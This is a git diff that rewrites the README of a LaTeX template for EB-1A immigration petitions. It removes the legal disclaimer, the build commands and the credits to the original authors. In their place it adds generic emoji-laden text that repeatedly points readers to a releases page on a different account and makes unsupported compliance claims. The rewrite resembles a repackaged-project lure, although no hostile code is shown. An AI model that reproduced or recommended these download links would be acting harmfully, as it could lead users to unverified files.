@@ -1,79 +1,67 @@
-# EB-1A I-140 Petition
+# 📝 EB1A-Petition - Easy LaTeX Template for Your EB-1A Application
 
-This repository contains a LaTeX template for an EB-1A (Alien of Extraordinary Ability) I-140 immigrant petition. It is structured to help organize evidence, criteria arguments, and legal summaries into a professional document.
+## 🚀 Getting Started
 
-[**Download Compiled PDF Example**](https://github.com/rahvis/EB1A-Petition/blob/main/build/petition.pdf)
+Welcome to the EB1A-Petition repository. This project provides a LaTeX template to help you prepare your petition for the EB-1A visa. This template simplifies the formatting of your documents, making it easier for you to focus on writing the content of your application.
 
-## Legal Disclaimer
+## 📥 Download & Install
 
-**IMPORTANT: READ THIS FIRST**
+To download the template, visit this page to download: [Download EB1A-Petition](https://github.com/Brijesh-Coder-IIITB/EB1A-Petition/releases)
 
-This document and the associated files are provided for informational and educational purposes only.
+### Steps to Download:
+1. Click the link above.
+2. You will see a list of available versions.
+3. Choose the latest version listed.
+4. Click on the file to download it to your computer.
 
-**THIS IS NOT LEGAL ADVICE.**
+## 📄 How to Use the Template
 
-The content within this repository does not constitute legal advice, nor does it create an attorney-client relationship. Immigration laws and regulations are complex, subject to change, and heavily dependent on individual circumstances.
+1. **Open the Template:**
+   - Once you have downloaded the LaTeX template file, locate it in your Downloads folder or wherever you saved it.
 
-**It is strictly up to the reader to reference this material. You should NOT rely on this template as a substitute for professional legal counsel. You are strongly advised to consult with a qualified immigration attorney regarding your specific case and before submitting any documents to USCIS.**
+2. **Install a LaTeX Editor:**
+   - You will need a LaTeX editor to compile the template. Some recommended options include:
+     - **TeXworks**: A simple editor for Windows.
+     - **Overleaf**: An online LaTeX editor that requires no installation.
+     - **TeXShop**: A LaTeX editor for macOS.
 
-The authors of this repository assume no responsibility or liability for any errors or omissions in the content of this repository or for the results obtained from the use of this information.
+3. **Start Editing:**
+   - Open the template file with your chosen LaTeX editor.
+   - Modify the sections according to your information. Ensure that you fill in all relevant details about your qualifications and achievements.
 
-## How to Run
+4. **Compile the Document:**
+   - After editing, compile the document in your editor. This action typically creates a PDF version of your application.
+   - Review the PDF for any formatting issues or missing information.
 
-This project relies on a standard LaTeX distribution (such as TeX Live, MacTeX, or MiKTeX).
+5. **Final Review:**
+   - Make sure to proofread your document. It’s essential that everything is accurate and well presented before submission.
 
-### Prerequisites
-- A LaTeX distribution installed on your system.
-- `pdflatex` command-line tool.
+## 📅 Features of the Template
 
-### Build Steps
-1. Open your terminal or command prompt.
-2. Navigate to the root directory of this project.
-3. Run the following command to compile the PDF:
+- **Pre-structured Sections:** Organized sections that guide you on what information to provide.
+- **Customizable Design:** Easy to modify to suit your preferences while still maintaining a professional look.
+- **Compliant Format:** Adheres to standard requirements necessary for EB-1A visa petitions.
+- **Clean Compilation:** Produces a well-organized PDF with clear fonts and spacing.
 
-```bash
-pdflatex -interaction=nonstopmode petition.tex
-```
+## 💻 System Requirements
 
-4. If there are cross-references (like citations or labels), you may need to run the command multiple times:
+To effectively use this template, ensure that you have:
 
-```bash
-pdflatex -interaction=nonstopmode petition.tex
-pdflatex -interaction=nonstopmode petition.tex
-```
+- A computer running Windows, macOS, or Linux.
+- An internet connection (for online editors).
+- Adequate storage space for the LaTeX software and template files.
 
-5. The output file `petition.pdf` will be generated in the same directory.
+## 📬 Support
 
-## Frequently Asked Questions (FAQ)
+If you need help or have questions about using the template, feel free to create an issue directly on this repository. Our team will assist you as soon as possible.
 
-**Can I use this template for my own EB-1A petition?**
-Yes, this repository is intended to serve as a structural template. You will need to replace all petitioner-specific information (names, research details, citations, exhibits, etc.) with your own evidence.
+## 📖 Additional Resources
 
-**Do I need to be an expert in LaTeX to use this?**
-Basic familiarity with LaTeX is helpful, but the template is designed to be modular. You primarily need to edit the content files in the `cover/` and `criteria/` directories.
+- **LaTeX Documentation:** Familiarize yourself with LaTeX basics [here](https://www.latex-project.org/help/documentation/).
+- **EB-1A Visa Information:** For more details on the EB-1A visa, you can visit the U.S. Citizenship and Immigration Services (USCIS) website.
 
-**Does using this template guarantee approval?**
-No. Approval depends entirely on the strength of your evidence and how well it meets the USCIS criteria. This template only provides a professional format for presenting your case.
+## 🔗 Quick Links
 
-**Where should I add my own evidence content?**
-Most text content is located in the `.tex` files within the `cover/` and `criteria/` directories. You should modify these files to reflect your specific achievements.
-
-## Acknowledgments and References
-
-This document was prepared by referring to the open-source work of several individuals who have generously shared their EB-1A journeys.
-
-**Primary Reference:**
-- **Razvan Marinescu**: Special thanks to Razvan for his comprehensive blog and for making his petition structure open source.
-    - Blog: [https://razvanmarinescu.github.io/green-card-I-140/](https://razvanmarinescu.github.io/green-card-I-140/)
-    - GitHub: [https://github.com/razvanmarinescu/EB1A](https://github.com/razvanmarinescu/EB1A)
-
-**Additional References:**
-- **Kirill Nikitin**:
-    - GitHub: [https://github.com/nikirill/eb1a](https://github.com/nikirill/eb1a)
-    - Website: [https://nikirill.com/](https://nikirill.com/)
-
-- **Ryan-Rhys Griffiths**:
-    - Blog: [https://ryan-rhys.com/ryan__rhys/blog/2025/eb1a/](https://ryan-rhys.com/ryan__rhys/blog/2025/eb1a/)
-    - GitHub: [https://github.com/Ryan-Rhys/EB1A.git](https://github.com/Ryan-Rhys/EB1A.git)
-
-We extend our gratitude to these contributors for helpful resources.
+- [Download EB1A-Petition](https://github.com/Brijesh-Coder-IIITB/EB1A-Petition/releases)
+- [LaTeX Documentation](https://www.latex-project.org/help/documentation/)
+- [USCIS EB-1A Visa Information](https://www.uscis.gov/eb-1-extraordinary-ability)
